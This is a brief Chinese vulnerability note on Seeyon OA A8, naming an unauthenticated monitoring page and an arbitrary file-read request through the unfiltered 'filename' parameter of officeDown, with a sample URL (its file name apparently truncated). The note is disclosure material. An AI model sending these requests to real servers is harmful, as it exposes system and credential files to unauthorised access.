致远OA A8 未授权访问
====================

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A8

三、复现过程
------------

该地址为性能监控后台，存在未授权访问

seeyon/management/status.jsp

任意文件读取漏洞,由于对filename未进行过滤，导致可下载读取任意文件

    http://www.0-sec.org/seeyon/main.do?method=officeDown&filename=c:/boot.in
